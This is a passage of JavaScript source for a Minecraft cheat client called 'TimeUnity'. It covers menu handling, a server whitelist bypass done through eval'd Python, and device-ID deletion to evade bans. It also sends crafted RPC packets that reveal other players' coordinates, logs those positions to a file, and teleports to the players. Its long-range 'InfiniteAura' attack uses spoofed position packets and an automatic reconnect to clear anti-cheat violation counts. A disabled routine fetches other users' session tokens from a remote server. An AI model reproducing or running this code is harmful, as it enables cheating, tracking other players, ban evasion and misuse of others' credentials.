                            _fs.write(_app.getResource() + "/TimeUnity/ModuleTip.json",
                                JSON.stringify({
                                    Enabled: Boolean(eventData[key]),
                                    MessageTip: Boolean(ModuleTip_MessageTip),
                                    GUITip: Boolean(ModuleTip_GUITip)
                                }, null, 2)
                            );
                        }
                        if (key == "ModuleTip_MessageTip") {
                            ModuleTip_MessageTip = eventData[key];
                            _fs.write(_app.getResource() + "/TimeUnity/ModuleTip.json",
                                JSON.stringify({
                                    Enabled: Boolean(ModuleTip_Enabled),
                                    MessageTip: Boolean(eventData[key]),
                                    GUITip: Boolean(ModuleTip_GUITip)
                                }, null, 2)
                            );
                        }
                        if (key == "ModuleTip_GUITip") {
                            ModuleTip_GUITip = eventData[key];
                            _fs.write(_app.getResource() + "/TimeUnity/ModuleTip.json",
                                JSON.stringify({
                                    Enabled: Boolean(ModuleTip_Enabled),
                                    MessageTip: Boolean(ModuleTip_MessageTip),
                                    GUITip: Boolean(eventData[key])
                                }, null, 2)
                            );
                        }
                        if (key == "ShowFPS") {
                            FPS_Enabled = eventData[key];
                            if (!FPS_Enabled) updateTextContent(FpsId, "");
                            _fs.write(_app.getResource() + "/TimeUnity/ShowFPS.txt", `${Boolean(eventData[key])}`);
                            ModuleTip("ShowFPS", eventData[key]);
                        }
                        if (key == "Debug") {
                            Debug_Enabled = eventData[key];
                            addCustomArrayList("Debug", '调试模式', '调试模式', eventData[key]);
                            ModuleTip("Debug", eventData[key]);
                        }
                        if (key == "SilentKill") {
                            SilentKill_Enabled = eventData[key];
                            addCustomArrayList("SilentKill", '击杀隐藏', '击杀隐藏', eventData[key]);
                            ModuleTip("SilentKill", eventData[key]);
                        }
                        if (key == "AntiText") {
                            AntiText = eventData[key];
                            addCustomArrayList("AntiText", '反文本轰炸', '反文本轰炸', eventData[key]);
                            ModuleTip("AntiText", eventData[key]);
                        }
                        if (key == "at_max_text") {
                            at_max_text = Number(eventData[key]);
                        }
                        if (key == "at_max_time") {
                            at_max_time = Number(eventData[key]);
                        }
                        if (key == "at_max_len") {
                            at_max_len = Number(eventData[key]);
                        }
                        if (eventData.PleaseCommand != null && eventData.PleaseCommand != undefined && eventData.PleaseCommand !== '') {
                            PleaseCommand = eventData.PleaseCommand;
                        }
                        if (eventData.key === "SendPleaseCommand") {
                            sendCommand(PleaseCommand);
                        }
                        if (key == "PleaseForCommand") {
                            PleaseForCommand = eventData[key];
                        }
                        if (key == "Fly") {
                            Fly = eventData[key];
                            addCustomArrayList("Fly", '飞行', '飞行', eventData[key]);
                            ModuleTip("Fly", eventData[key]);
                        }
                        if (eventData["Fly_choice"] == "Fly_Pos") {
                            Fly_Pos = true;
                            Fly_Motion = false;
                        }
                        if (eventData["Fly_choice"] == "Fly_Motion") {
                            Fly_Motion = true;
                            Fly_Pos = false;
                        }
                        if (key == "Fly_Snake") {
                            Fly_Snake = eventData[key];
                        }
                        if (key == "Fly_Packet") {
                            Fly_Packet = eventData[key];
                        }
                        if (key == "Fly_Speed") {
                            Fly_Speed = Number(eventData[key]);
                        }
                        if (key == "Fly_SetUD") {
                            Fly_SetUD = Number(eventData[key]);
                        }
                        if (eventData.key === "fakeOP") {
                            _app.showToast("正在利用漏洞夺权");
                            Me
                            setTimeout(() => {
                                _app.showToast("已夺取权限");
                            }, 2000);
                            CheckLogin = false;
                        }
                        if (eventData.key === "Summon") {
                            Summon();
                        }
                        if (eventData.key === "ModPetName") {
                            _minecraft.sendChatMessage("[TimeUnity]ModPetName");
                        }
                        if (key == "ModPetData") {
                            ModPetData = eventData[key];
                        }
                        if (eventData.key === "CheckStructure") {
                            CheckStructure();
                        }
                        if (eventData.key === "SelfCollapse") {
                            SelfCollapse();
                        }
                        if (eventData.key === "getUID") {
                            getPlayeruid();
                        }
                        if (eventData.key === "getServer") {
                            getServer();
                        }
                        if (eventData.key === "getInformation") {
                            getPlayerInformation();
                        }
                        if (eventData.key === "getServerIP") {
                            getServerIP();
                        }
                        if (eventData.key === "getServerFlag") {
                            getServerFlag();
                        }
                        if (eventData.key === "FillServer") {
                            FillServer();
                        }
                        if (eventData.key === "CrackSkin") {
                            CrackSkin();
                        }
                        if (eventData.key === "BypassWhitelist") {
                            if (!_app.isInGame()) {
                                _app.evalPython(`from gui_2d import GUI, ui_const, event_const, consts
from gui_2d.ui_service.ui_request import request
import mc_game_ctrl, realms_main, record, tan_lobby_ctrl
from gui_2d.consts import InGameType
from gui_2d.utils import util
from gui_2d.utils.PrePlayWorld import pre_play_world
import application, sys
from gui_2d.utils.SALogUtil import SALoggerManager, P2LogOperationEnum

class ServerJoinProcess:
    def __init__(self):
        self.user_input_server_id = ""
        self.password = ""
        self.custom_ip = ""
        self.custom_port = 19132
        self.actual_server_id = ""
        self.server_name = ""
        self.server_entity = None
        self.game_info = None
        self.final_ip = ""
        self.final_port = 19132

    def start(self):
        GUI.message_box_mgr.tip_msg_box(
            msg_type=ui_const.COMMON_INPUT_POP_UP_WINDOW,
            title='请输入服务器号',
            confirm_callback=self.on_server_id_input,
            cancel_callback=None,
            place_holder='例如: 123456789',
            max_length=50
        )

    def on_server_id_input(self, input_text):
        if not input_text or not input_text.strip():
            GUI.ui_mgr.show_toast("请输入服务器号", False)
            return
        
        self.user_input_server_id = input_text.strip()
        
        GUI.message_box_mgr.tip_msg_box(
            msg_type=ui_const.COMMON_INPUT_POP_UP_WINDOW,
            title='请输入密码',
            confirm_callback=self.on_password_input,
            cancel_callback=self.on_password_cancel,
            confirm_text='确定',
            cancel_text='无密码',
            place_holder='输入密码',
            max_length=50
        )

    def on_password_cancel(self):
        self.on_password_input("")

    def on_password_input(self, input_text):
        if input_text and input_text.strip():
            self.password = input_text.strip()
        else:
            self.password = ""
            
        GUI.message_box_mgr.tip_msg_box(
            msg_type=ui_const.COMMON_INPUT_POP_UP_WINDOW,
            title='请输入IP端口',
            confirm_callback=self.on_ip_port_input,
            cancel_callback=None,
            confirm_text='确定',
            place_holder='例如: 127.0.0.1:19132',
            max_length=50
        )

    def on_ip_port_input(self, input_text):
        if not input_text or not input_text.strip() or ':' not in input_text:
            GUI.ui_mgr.show_toast("请正确填写IP和端口", False)
            return
            
        try:
            ip, port_str = input_text.strip().split(':', 1)
            self.custom_port = int(port_str)
            self.custom_ip = ip
        except:
            GUI.ui_mgr.show_toast("格式错误", False)
            return

        request({
            'url': '/rental-server/query/search-by-name',
            'hostName': 'WebServerUrl',
            'method': 'POST',
            'params': {
                'server_name': self.user_input_server_id,
                'offset': 0
            }
        }, self.on_search_response)

    def on_search_response(self, response):
        if response.entity and len(response.entity) > 0:
            self.server_entity = response.entity[0]
            self.actual_server_id = self.server_entity.get('entity_id')
            self.server_name = self.server_entity.get('server_name', self.user_input_server_id)
            
            request_params = {'server_id': self.actual_server_id, 'pwd': self.password}
            request({
                'url': '/rental-server-world-enter/get',
                'hostName': 'WebServerUrl',
                'method': 'POST',
                'params': request_params
            }, self.on_enter_response)
        else:
            GUI.ui_mgr.show_toast("未找到服务器", False)

    def on_enter_response(self, response):
        self.final_ip = self.custom_ip
        self.final_port = self.custom_port
        
        if response.code == 0 and response.entity:
            res_ip = response.entity.get('mcserver_host', '')
            res_port = response.entity.get('mcserver_port', 0)
            if res_ip:
                self.final_ip = res_ip
                self.final_port = res_port

        self.game_info = {
            'gameType': InGameType.RentalGame,
            'id': self.actual_server_id,
            'room_name': self.server_name,
            'min_level': self.server_entity.get('min_level', 0),
            'ownerId': self.server_entity.get('owner_id', ''),
            'ownerName': self.server_entity.get('ownerName', ''),
            'res_name': self.server_name
        }
        
        pre_play_world_params = {
            'warningFor4G': True,
            'gameType': InGameType.RentalGame,
            'item_id': self.actual_server_id,
            'room_name': self.server_name
        }
        
        pre_play_world(pre_play_world_params, self.on_pre_check)

    def on_pre_check(self, is_success, msg=''):
        if not is_success:
            GUI.ui_mgr.show_toast(msg or '进入游戏失败', False)
            return
        
        if hasattr(GUI.game_data_mgr, 'lobby_game_mgr'):
            GUI.game_data_mgr.lobby_game_mgr.leave_main_city(callback=self.enter_game)
        else:
            self.enter_game()

    def enter_game(self):
        mc_game_ctrl.instance.setCurGameInfo(self.game_info)
        util.add_play_game_record(self.game_info)
        GUI.game_mgr.game_type = InGameType.RentalGame
        
        host_dict = {
            'BGP': self.final_ip,
            'ISP': self.final_ip
        }
        port_dict = {
            'BGP': self.final_port,
            'ISP': self.final_port
        }
        
        realms_main.join_rental_game(
            host_dict,
            port_dict,
            self.actual_server_id,
            self.server_name
        )

def input_server_id():
    process = ServerJoinProcess()
    process.start()

input_server_id()`);
                            } else {
                                _app.showToast("请在局外使用");
                            }
                        }
                        if (eventData.key === "infiniteCookie") {
                            infiniteCookie();
                        }
                        if (eventData.key === "RandomDeviceid") {
                            if (_fs.exists(getFilesPath() + "/games/com.netease/minecraftpe/hs.hex")) {
                                _fs.remove(getFilesPath() + "/games/com.netease/minecraftpe/hs.hex");
                                _app.showToast("设备码修改成功，用于绕过机器人设备封禁，重进游戏生效");
                            } else {
                                _app.showToast("设备码修改失败");
                            }
                        }
                        if (eventData.key === "ChangeName") {
                            ChangeName();
                        }
                        if (key == "CustomSky") {
                            CustomSkyValue++
                            if (CustomSkyValue > 1) {
                                RGBA = ColorToRGBA(eventData[key]);
                                SetSkyColor(self_id, RGBA[0], RGBA[1], RGBA[2], RGBA[3]);
                            }
                        }
                        if (eventData.key.startsWith("User ")) {
                            _app.showToast('由于数据库中的曲奇已过期，暂时无法使用');
                            return;
                            const marker = eventData.key.split(" ")[1];
                            UserMarker = marker;
                            _app.showToast('等待服务器响应...');
                            _https.get(`http://time.fuhongweb.cn/getUserSauth?marker=${marker}&${FileContent}&token=${md5(FileContent + "&marker=" + marker + Date.now() + "TimeCookie")}&time=${Date.now()}`, {}, function(code, response) {
                                const Data = XorDecrypt(response, "f8f617eaaf7eb5580cd4abb3ce2f8953");
                                if (code == 403 && Data === "切换账号过于频繁") {
                                    _app.showToast("切换账号过于频繁");
                                }
                                if (code === 200) {
                                    if (Data === "错误：未找到匹配的标记") {
                                        _app.showToast("账号错误");
                                    } else {
                                        _app.showToast("请重新登录账号");
                                        UserList_Cookie = Data;
                                    }
                                }
                            });
                        }
                    }
                } catch (e) {}
            }
            if (eventData.key === "TU_exit") {
                Tool_Exit();
            }
            if (eventData.key === "UpdateUser") {
                UpdateUser();
            }
            if (eventData.key === "Register") {
                if (CheckLogin) {
                    _app.showToast("您已登录 无需注册");
                } else {
                    _menu.load("用户注册", Register);
                    thread(() => {
                        _menu.show("用户注册");
                    }, 50);
                }
            }
            if (eventData.key === "Login") {
                if (CheckLogin) {
                    _app.showToast("您已登录");
                } else {
                    _menu.load("用户登录", Login)
                    thread(() => {
                        _menu.show("用户登录");
                    }, 50);
                }
            }
            if (eventData.key === "ExitLogin") {
                if (CheckLogin) {
                    _app.showToast("已退出登录");
                    _fs.remove(LoginFile);
                    CheckLogin = false;
                } else {
                    _app.showToast("您还没有登录");
                }
            }
            if (eventData.key === "leaveWorld") {
                if (CheckLogin) {
                    _world.leaveWorld();
                }
            }
            if (eventData.Registeruser != null && eventData.Registeruser != undefined && eventData.Registeruser !== '') {
                Registeruser = eventData.Registeruser;
            }
            if (eventData.Registerpass != null && eventData.Registerpass != undefined && eventData.Registerpass !== '') {
                Registerpass = eventData.Registerpass;
            }
            if (eventData.key === "Confirm_Registration") {
                Registration();
            }
            if (eventData.loginUser != null && eventData.loginUser != undefined && eventData.loginUser !== '') {
                loginUser = eventData.loginUser;
            }
            if (eventData.loginpass != null && eventData.loginpass != undefined && eventData.loginpass !== '') {
                loginpass = eventData.loginpass;
            }
            if (eventData.key === "Confirm_Login") {
                UserLogin();
            }
        }
    } catch (error) {
        _minecraft.clientMessage(error.toString());
    }
}

function StringToHex(str) {
    let result = "";
    for (let i = 0; i < str.length; i++) {
        result += str.charCodeAt(i).toString(16);
    }
    return result;
}

function RenderTransferMenu() {
    try {
        if (_app.isInGame()) {
            CyclePlayerList = [];
            CloseTransferMenu("ChtransferMenu");

            let players = CachedPlayerList || getWorldPlayerList();

            let jsonItems = `
            {
                "name": "刷新列表",
                "key": "RefreshTransferList",
                "color": "#B4000000",
                "type": "TextView"
            }`;

            for (let i = 0; i < players.length; i++) {
                const switchKey = "TransferPlayer" + i;
                jsonItems += `,
                {
                    "type": "Switch",
                    "key": "${switchKey}",
                    "name": "${(i + 1)}.${players[i].name}",
                    "color": "#B4000000"
                }`;
            }

            setTimeout(() => {
                _menu.load("ChtransferMenu", `{
                                                                                                                                                                                                                                      "type": "Menu",
                    "color": "${main_color || "#FFFFFF"}",
                    "alpha": ${main_alpha || 0.85},
                    "radius": 8,
                    "can_close": true,
                    "title": {
                        "name": "传送列表",
                        "size": 16,
                        "elevation": 3,
                        "background": "${main_title_background || "#FFFFFF"}",
                        "padding": [4, 2, 4, 2],
                        "text_margins": [3, 2, 3, 2],
                        "margins": "1",
                        "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
                    },
                    "show_dividers": false,
                    "items": [
                        {
                            "type": "TextView",
                            "name": "",
                            "color": "#B4000000",
                            "tag": "FriendCoordinates",
                            "items": [${jsonItems}]
                        }
                    ]
                }`);
            }, 300);
        }
    } catch (e) {}
}

function Render_Global_InfiniteAura_Menu() {
    try {
        if (_app.isInGame()) {
            Global_InfiniteAura_PlayerList = [];
            CloseTransferMenu("Global_InfiniteAura_Menu");
            let players = Global_InfiniteAura_List || getWorldPlayerList();
            let jsonItems = `
            {
                "name": "刷新列表",
                "key": "Refresh_Global_InfiniteAura_List",
                "color": "#B4000000",
                "type": "TextView"
            }`;
            for (let i = 0; i < players.length; i++) {
                const switchKey = "Global_InfiniteAura_Player" + i;
                jsonItems += `,
                {
                    "type": "Switch",
                    "key": "${switchKey}",
                    "name": "${(i + 1)}.${players[i].name}",
                    "color": "#B4000000"
                }`;
            }
            setTimeout(() => {
                _menu.load("Global_InfiniteAura_Menu", `{
                                                                                                                                                                                                                                      "type": "Menu",
                    "color": "${main_color || "#FFFFFF"}",
                    "alpha": ${main_alpha || 0.85},
                    "radius": 8,
                    "can_close": true,
                    "title": {
                        "name": "百米列表",
                        "size": 16,
                        "elevation": 3,
                        "background": "${main_title_background || "#FFFFFF"}",
                        "padding": [4, 2, 4, 2],
                        "text_margins": [3, 2, 3, 2],
                        "margins": "1",
                        "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
                    },
                    "show_dividers": false,
                    "items": [
                        {
                            "type": "TextView",
                            "name": "",
                            "color": "#B4000000",
                            "tag": "FriendCoordinates",
                            "items": [${jsonItems}]
                        }
                    ]
                }`);
            }, 300);
        }
    } catch (e) {}
}

function Render_ParticleBoom_Menu() {
    try {
        if (_app.isInGame()) {
            ParticleBoom_PlayerList = [];
            CloseTransferMenu("ParticleBoom_Menu");
            let players = ParticleBoom_List || PlayerMap;
            let jsonItems = `{
                "name": "刷新列表",
                "key": "Refresh_ParticleBoom_List",
                "color": "#B4000000",
                "type": "TextView"
            }`;
            if (!players || players.length === 0) {
                jsonItems += `,
                {
                    "type": "TextView",
                    "name": "获取列表失败 请重进世界",
                    "color": "#B4000000"
                }`;
            } else {
                for (let i = 0; i < players.length; i++) {
                    jsonItems += `,
                    {
                        "type": "Switch",
                        "key": "ParticleBoom_Player${i}",
                        "name": "${(i + 1)}.${players[i].name}",
                        "color": "#B4000000"
                    }`;
                }
            }
            setTimeout(() => {
                _menu.load("ParticleBoom_Menu", `{
                                                                                                                                                                                                                                      "type": "Menu",
                    "color": "${main_color || "#FFFFFF"}",
                    "alpha": ${main_alpha || 0.85},
                    "radius": 8,
                    "can_close": true,
                    "title": {
                        "name": "粒子爆炸",
                        "size": 16,
                        "elevation": 3,
                        "background": "${main_title_background || "#FFFFFF"}",
                        "padding": [4, 2, 4, 2],
                        "text_margins": [3, 2, 3, 2],
                        "margins": "1",
                        "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
                    },
                    "show_dividers": false,
                    "items": [
                        {
                            "type": "TextView",
                            "name": "",
                            "color": "#B4000000",
                            "tag": "FriendCoordinates",
                            "items": [${jsonItems}]
                        }
                    ]
                }`);
            }, 300);
        }
    } catch (e) {}
}

function ProcessRpcQueue() {
    sendPyRpc(98247598, "93c401729200c4314d696e6563726166743a7065743a7065745f736b696c6c5f667269656e645f6332735f6765745f667269656e645f706f73c0");
    let targetId = RpcQueue.shift();
    CurrentTargetId = targetId;
    if (targetId) {
        let p1 = "c4" + targetId.length.toString(16).padStart(2, "0") + StringToHex(targetId);
        let p2 = "c4" + self_id.length.toString(16).padStart(2, "0") + StringToHex(self_id);
        let payload = "93c40163920082c407706c617965727391" + p1 + "c40b726571506c617965724964" + p2 + "c0";
        sendPyRpc(98247598, payload);
    }
}

function BatchQueryPlayers(playerList) {
    sendPyRpc(98247598, "93c401729200c4314d696e6563726166743a7065743a7065745f736b696c6c5f667269656e645f6332735f6765745f667269656e645f706f73c0");

    let targets = CyclePlayerList.map(item => {
        return (typeof item === "string") ? item.slice(6).trim() : item;
    }).filter(item => item !== null && item !== undefined);

    if (playerList.length != 0) {
        for (let i = 0; i < targets.length; i++) {
            const index = parseInt(targets[i], 10);

            if (playerList[index] && playerList[index].id != self_id) {
                let p1 = "c4" + playerList[index].id.length.toString(16).padStart(2, "0") + StringToHex(playerList[index].id);
                let p2 = "c4" + self_id.length.toString(16).padStart(2, "0") + StringToHex(self_id);
                let payload = "93c40163920082c407706c617965727391" + p1 + "c40b726571506c617965724964" + p2 + "c0";
                sendPyRpc(98247598, payload);
            }
        }
    } else {
        CyclePlayerList = [];
    }
}

function SendSingleQuery(targetId) {
    let p1 = "c4" + targetId.length.toString(16).padStart(2, "0") + StringToHex(targetId);
    let p2 = "c4" + self_id.length.toString(16).padStart(2, "0") + StringToHex(self_id);
    let randomHex;
    do {
        randomHex = Math.floor(Math.random() * 256).toString(16).padStart(3, "0");
    } while (randomHex === "c0");
    let payload = "93c40163920082c407706c617965727391" + p1 + "c40b726571506c617965724964" + p2 + randomHex;
    sendPyRpc(98247598, payload);
}

function GetDistance(targetPos) {
    const myPos = getEntityPos(self_id);
    const dx = targetPos.x - myPos.x;
    const dy = targetPos.y - myPos.y;
    const dz = targetPos.z - myPos.z;
    return Math.sqrt(dx * dx + dy * dy + dz * dz);
}

function CloseTransferMenu(menuName) {
    thread(() => {
        _menu.hide(menuName);
        _menu.remove(menuName);
    }, 0);
}

function TickRpc() {
    try {
        if (_app.isInGame()) {
            if (TransferPlayer_CycleTP && IsRpcReady) {
                BatchQueryPlayers(CachedPlayerList);
            }
            SendSingleQuery(CurrentTargetId);
            SendSingleQuery(CurrentTargetId);
            if (RpcQueue.length != 0) {
                ProcessRpcQueue();
            }
        }
    } catch (e) {}
}

function onPyRpcReceiveEvent(id, data, json) {
    if (json.includes("isSameDimensionMap")) {
        try {
            var dataObj = JSON.parse(json);
            var mapData = dataObj.value[1].value[1].value;
            var pos = {
                x: 0,
                y: 0,
                z: 0
            };
            var isSame = false;
            var name = "TargetNotFound";
            var uid = "";
            for (var i = 0; i < mapData.length; i++) {
                var mKey = mapData[i].key.value;
                var mVal = mapData[i].value.value;
                if (!mVal || mVal.length === 0) continue;
                if (mKey === "posMap") {
                    var tupleArr = mVal[0].value.value;
                    for (var j = 0; j < tupleArr.length; j++) {
                        if (tupleArr[j].key.value === "value") {
                            var pArr = tupleArr[j].value.value;
                            pos.x = pArr[0].value;
                            pos.y = pArr[1].value;
                            pos.z = pArr[2].value;
                            break;
                        }
                    }
                } else if (mKey === "isSameDimensionMap") {
                    isSame = mVal[0].value.value;
                } else if (mKey === "nameMap") {
                    name = mVal[0].value.value;
                    uid = mVal[0].key.value;
                }
            }
            if (TransferPlayers_IsTP) {
                if (name !== "TargetNotFound") {
                    if (EnableCoordinatesMsg) {
                        var dist = isSame ? (GetDistance(pos) >= 1000 ? (GetDistance(pos) / 1000).toFixed(1) + "km" : GetDistance(pos).toFixed(1) + "m") : "N/A";
                        _minecraft.clientMessage("§d§l玩家: §e" + name + "\n§d坐标: §e[" + parseInt(pos.x) + "," + parseInt(pos.y) + "," + parseInt(pos.z) + "]\n§d维度: §e" + (isSame ? "相同" : "不同") + (isSame ? "\n§d距离: §e" + dist : ""));
                    }
                    if (EnableLogToFile) {
                        var date = new Date();
                        var timeStr = date.getFullYear() + "-" + (date.getMonth() + 1).toString().padStart(2, '0') + "-" + date.getDate().toString().padStart(2, '0') + " " + date.toTimeString().split(' ')[0];
                        var path = _app.getResource() + "/TimeUnity/PlayerPos.json";
                        var logObj = {
                            "时间": timeStr,
                            "玩家": name,
                            "维度": isSame,
                            "坐标": [parseInt(pos.x), parseInt(pos.y), parseInt(pos.z)]
                        };
                        var oldLog = [];
                        try {
                            oldLog = JSON.parse(_fs.read(path)) || [];
                        } catch (e) {}
                        if (!Array.isArray(oldLog)) oldLog = [oldLog];
                        oldLog.push(logObj);
                        _fs.write(path, JSON.stringify(oldLog, null, 4));
                    }
                    if (Math.abs(pos.x) <= 30000000) {
                        if (isSame) {
                            if (EnableOffset) {
                                pos.x += OffsetX;
                                pos.y += OffsetY;
                                pos.z += OffsetZ;
                            }
                            if (EnableTeleport) setEntityPos(self_id, pos.x, pos.y + 1.62, pos.z);
                            if (EnableTeleportTip) _minecraft.clientMessage("已传送至 " + name);
                        } else {
                            _app.showToast("与目标维度不同");
                        }
                    } else {
                        _app.showToast("坐标解析异常");
                    }
                } else {
                    _app.showToast("目标玩家不存在");
                }
                IsRpcReady = true;
                TransferPlayers_IsTP = false;
            } else if (Global_InfiniteAura_PlayerTP) {
                for (let i = 0; i < Global_InfiniteAura_TeleCount; i++) {
                    sendPlayerAuthInput({
                        pos: pos,
                        motion: {
                            x: 0,
                            y: 0,
                            z: 0
                        }
                    });
                }
                for (let i = 0; i < Global_InfiniteAura_AttackCount; i++) {
                    InfiniteAura_attackEntity(uid, true, pos);
                }
                sendPlayerAuthInput({
                    pos: self_pos,
                    motion: {
                        x: 0,
                        y: 0,
                        z: 0
                    }
                });
            }
        } catch (e) {
            _minecraft.clientMessage(e);
        }
    }
    if (PyRpcTube && PyRpcTube_Receive) {
        const Hex = Array.from(new Uint8Array(data), byte => byte.toString(16).padStart(2, '0')).join('');
        const logPath = _app.getResource() + "/TimeUnity/PyRpc_Record.json";
        const timeTag = `[${timestampToTime(Math.floor(Date.now() / 1000))}]`;
        if (_fs.exists(logPath)) {
            _fs.write(logPath, `${_fs.read(logPath)}${timeTag} ${id} ${Hex}\n`);
        } else {
            _fs.write(logPath, `${timeTag} ${id} ${Hex}\n`);
        }
        if (PyRpcTube_Tip) {
            _minecraft.clientMessage(`§b${id} §a${Hex}`);
        }
    }
    return false;
}

function Teleport(x, y, z) {
    const teleportData = {
        pos: {
            x,
            y,
            z
        },
        actions: [{
            pos: {
                x,
                y,
                z
            },
            value: 1,
            type: 25
        }]
    };
    sendPlayerAuthInput(teleportData);
}

/*@百米大刀*/
function InfiniteAura() {
    if (!InfiniteAura_Enabled) return;
    InfiniteAura_counter++;
    if (InfiniteAura_counter < InfiniteAura_Interval) return;
    InfiniteAura_counter = 0;
    InfiniteAura_Timing++;
    const allTargets = [];
    if (InfiniteAura_Entity_Enabled) {
        for (const entityId of getEntityList()) {
            const entityType = getEntityNamespace(entityId);
            if (['minecraft:item', 'minecraft:xp_orb', 'netease:pet', 'minecraft:arrow', 'minecraft:thrown_trident'].includes(entityType)) continue;
            const Health = getEntityAttribute(entityId, 'minecraft:health')['current'];
            if (Health === 0) continue;
            const entityName = getEntityName(entityId);
            if (InfiniteAura_BlackList_Enabled && InfiniteAura_BlackList && !InfiniteAura_BlackList.some(item => entityName.includes(item))) continue;
            if (InfiniteAura_WhiteList_Enabled && InfiniteAura_WhiteList && InfiniteAura_WhiteList.some(item => entityName.includes(item))) continue;
            const targetPos = getEntityPos(entityId);
            const range = getRange(self_pos, targetPos);
            if (range <= InfiniteAura_MaxRange) {
                allTargets.push({
                    id: entityId,
                    health: Health,
                    range: range,
                    name: entityName,
                    pos: targetPos
                });
            }
        }
    }
    if (InfiniteAura_Player_Enabled && InfiniteAura_Timing >= InfiniteAura_Delay) {
        for (const playerId of getPlayerList()) {
            if (playerId === self_id) continue;
            const Health = getEntityAttribute(playerId, 'minecraft:health')['current'];
            if (Health === 0) continue;
            if (AutoTeam) {
                const selfArmor = getPlayerArmorItem(self_id, 0);
                const playerArmor = getPlayerArmorItem(playerId, 0);
                if (check_armor && (getText(selfArmor, 'customColor:', ',') || getText(selfArmor, 'customColor:', '}')) === (getText(playerArmor, 'customColor:', ',') || getText(playerArmor, 'customColor:', '}'))) continue;
                if (check_skin && playerArmor == "{Count:0b,Damage:0s,ExtraData:{attackDamage:0,aux:0,maxDamage:0,maxStackSize:255b,maxUseDuration:0,name:\"\",netId:0},Name:\"\",WasPickedUp:0b}") continue;
            }
            const playerName = getEntityName(playerId);
            if (InfiniteAura_BlackList_Enabled && InfiniteAura_BlackList && !InfiniteAura_BlackList.some(item => playerName.includes(item))) continue;
            if (InfiniteAura_WhiteList_Enabled && InfiniteAura_WhiteList && InfiniteAura_WhiteList.some(item => playerName.includes(item))) continue;
            const targetPos = getEntityPos(playerId);
            const range = getRange(self_pos, targetPos);
            if (range <= InfiniteAura_MaxRange) {
                allTargets.push({
                    id: playerId,
                    health: Health,
                    range: range,
                    name: playerName,
                    pos: targetPos
                });
            }
        }
        InfiniteAura_Timing = 0;
    }
    if (allTargets.length === 0) {
        _minecraft.showTipMessage("§l§b[TimeUnity]§r§7 >> §fInfiniteAura§7 >> §f没有合适的目标");
        return;
    }
    allTargets.sort((a, b) => a.range - b.range);
    const attackedTargets = [];
    for (const target of allTargets.slice(0, MaxTarget)) {
        const currentPos = getEntityPos(target.id);
        const currentRange = getRange(self_pos, currentPos);
        if (currentRange > InfiniteAura_MaxRange) {
            continue;
        }
        let targetPos = target.pos;
        if (HYT_Config) {
            const self_move = self_motion;
            for (let i = 0; i < 13; i++) {
                Teleport(targetPos.x, targetPos.y, targetPos.z);
            }
            setEntityPos(self_id, targetPos.x, targetPos.y, targetPos.z);
            for (let i = 0; i < 3; i++) {
                if (InfiniteAura_TPClick) buildBlock(self_id, targetPos.x, targetPos.y, targetPos.z, 1);
                attackEntity(target.id, InfiniteAura_swing);
            }
            if (InfiniteAura_ReturnClick) buildBlock(self_id, self_pos.x, self_pos.y, self_pos.z, 1);
            setEntityPos(self_id, self_pos.x, self_pos.y, self_pos.z);
            setEntityMotion(self_id, self_move.x, self_move.y, self_move.z);
        }
        if (BJD_Mode) {
            targetPos.y += 1.62;
            const dx = targetPos.x - self_pos.x;
            const dy = targetPos.y - self_pos.y;
            const dz = targetPos.z - self_pos.z;
            const dist = Math.sqrt(dx * dx + dy * dy + dz * dz);
            const steps = Math.ceil(dist / 16);
            for (let i = 1; i <= steps; i++) {
                const progress = i / steps;
                InfiniteAura_PlayerAuthInput = true;
                sendPlayerAuthInput({
                    pos: {
                        x: self_pos.x + (dx * progress),
                        y: self_pos.y + (dy * progress),
                        z: self_pos.z + (dz * progress)
                    },
                    motion: {
                        x: 0,
                        y: 0,
                        z: 0
                    }
                });
                InfiniteAura_BJD_Mode_VLCount++;
            }
            InfiniteAura_attackEntity(target.id, InfiniteAura_swing, targetPos);
            // SilentAttackEntity(target.id, getPlayerSelectItemSlot(self_id), targetPos);
            InfiniteAura_PlayerAuthInput = true;
            sendPlayerAuthInput({
                pos: self_pos,
                motion: {
                    x: 0,
                    y: 0,
                    z: 0
                }
            });
            InfiniteAura_BJD_Mode_VLCount++;
            if (InfiniteAura_BJDMode_Reconnect && InfiniteAura_BJD_Mode_VLCount >= 80 && !InfiniteAura_BJD_Mode_VL) {
                _minecraft.clientMessage("§l§cVL已抵达临界值，即将自动重进清空VL");
                InfiniteAura_BJD_Mode_VL = true;
                _app.executePluginCommand("/ww server play.bjd-mc.com 19132");
            }
        } else if (NodeMode) {
            for (let i = 0; i < InfiniteAura_TeleCount; i++) {
                sendPlayerAuthInput({
                    pos: targetPos
                });
            }
            for (let i = 0; i < InfiniteAura_AtkStats; i++) {
                InfiniteAura_attackEntity(target.id, InfiniteAura_swing, targetPos);
            }
        } else {
            for (let i = 0; i < InfiniteAura_TeleCount; i++) {
                Teleport(targetPos.x, targetPos.y, targetPos.z);
            }
            for (let i = 0; i < InfiniteAura_AtkStats; i++) {
                if (InfiniteAura_TPClick) buildBlock(self_id, targetPos.x, targetPos.y, targetPos.z, 1);
                InfiniteAura_attackEntity(target.id, InfiniteAura_swing, targetPos);
            }
            if (InfiniteAura_ReturnClick) buildBlock(self_id, self_pos.x, self_pos.y, self_pos.z, 1);
            if (InfiniteAura_ReturnPacket) Teleport(self_pos.x, self_pos.y, self_pos.z);
        }
        attackedTargets.push(target.name);
    }
    if (attackedTargets.length === 0) {
        _minecraft.showTipMessage("§l§b[TimeUnity]§r§7 >> §fInfiniteAura§7 >> §f没有合适的目标");
        return;
    }
    const mode = InfiniteAura_Monomer_Enabled ? "目标" : "目标";
    _minecraft.showTipMessage(`§l§b[TimeUnity]§r§7 >> §fInfiniteAura§7 >> §f正在攻击${mode} ${attackedTargets.join(' ')}`);
    InfiniteAura_TeleportCounter = (InfiniteAura_TeleportCounter + 1) % InfiniteAura_Teleport;
}
/*#百米大刀*/

const getVector = (speed, yaw, angle) => {
    let Yaw = getAngle(yaw + angle)
    const YawRad = (Yaw * Math.PI) / 180
    return {
        x: -(speed * Math.cos(YawRad)),
        y: 0,
        z: -(speed * Math.sin(YawRad))
    }
}

const getAngle = (angle) => {
    angle = angle % 360
    return angle > 180 ? angle - 360 : angle
}

function isInFOV(selfPos, selfRot, targetPos, fov) {
    const dx = targetPos.x - selfPos.x;
    const dy = targetPos.y - selfPos.y;
